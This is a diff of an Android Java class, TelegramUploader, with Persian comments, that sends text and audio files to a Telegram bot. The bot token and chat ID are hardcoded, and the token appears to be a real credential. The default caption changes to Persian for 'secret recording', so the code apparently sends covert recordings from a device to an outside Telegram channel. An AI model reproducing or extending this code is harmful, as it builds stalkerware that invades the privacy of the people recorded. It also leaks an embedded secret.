@@ -7,15 +7,13 @@ import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.RequestBody;
 import okhttp3.Response;
+import org.json.JSONObject;
 import java.io.File;
 import java.util.concurrent.TimeUnit;
-import org.json.JSONObject;
 
 public class TelegramUploader {
     private static final String TAG = "TelegramUploader";
     private static final String TELEGRAM_API = "https://api.telegram.org";
-    private static final String DEFAULT_BOT_TOKEN = "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM";
-    private static final String DEFAULT_CHAT_ID = "-1004352035353";
     
     private OkHttpClient httpClient;
     
@@ -27,6 +25,35 @@ public class TelegramUploader {
             .build();
     }
     
+    // ارسال پیام متنی به تلگرام
+    public boolean sendMessage(String botToken, String chatId, String message) {
+        try {
+            String url = TELEGRAM_API + "/bot" + botToken + "/sendMessage";
+            
+            RequestBody body = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("text", message)
+                .build();
+            
+            Request request = new Request.Builder()
+                .url(url)
+                .post(body)
+                .build();
+            
+            Response response = httpClient.newCall(request).execute();
+            boolean success = response.isSuccessful();
+            Log.d(TAG, "Send message: " + (success ? "OK" : "FAILED"));
+            response.close();
+            return success;
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Send message error", e);
+            return false;
+        }
+    }
+    
+    // آپلود فایل صوتی
     public boolean uploadAudio(String filePath, String botToken, String chatId, String caption) {
         try {
             File file = new File(filePath);
@@ -35,19 +62,28 @@ public class TelegramUploader {
                 return false;
             }
             
-            String finalBotToken = (botToken == null || botToken.isEmpty()) ? DEFAULT_BOT_TOKEN : botToken;
-            String finalChatId = (chatId == null || chatId.isEmpty()) ? DEFAULT_CHAT_ID : chatId;
+            // استفاده از توکن دیفالت اگر null باشه
+            String finalBotToken = (botToken == null || botToken.isEmpty()) 
+                ? "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM" 
+                : botToken;
+            String finalChatId = (chatId == null || chatId.isEmpty()) 
+                ? "-1004352035353" 
+                : chatId;
             
             Log.d(TAG, "Uploading to chat: " + finalChatId);
-            Log.d(TAG, "File: " + file.getAbsolutePath() + " (" + file.length() + " bytes)");
+            Log.d(TAG, "File size: " + file.length() + " bytes");
             
-            // استفاده از sendVoice برای فایل‌های صوتی بهتره
-            RequestBody fileBody = RequestBody.create(file, MediaType.parse("audio/m4a"));
+            // استفاده از sendVoice برای فایل‌های صوتی
+            RequestBody fileBody = RequestBody.create(
+                file, 
+                MediaType.parse("audio/m4a")
+            );
+            
             RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", finalChatId)
                 .addFormDataPart("voice", file.getName(), fileBody)
-                .addFormDataPart("caption", caption != null ? caption : "🎙️ Voice message")
+                .addFormDataPart("caption", caption != null ? caption : "🎙️ ضبط مخفی")
                 .build();
             
             String url = TELEGRAM_API + "/bot" + finalBotToken + "/sendVoice";
@@ -74,7 +110,7 @@ public class TelegramUploader {
             return success;
             
         } catch (Exception e) {
-            Log.e(TAG, "Upload error: " + e.getMessage(), e);
+            Log.e(TAG, "Upload error", e);
             return false;
         }
     }
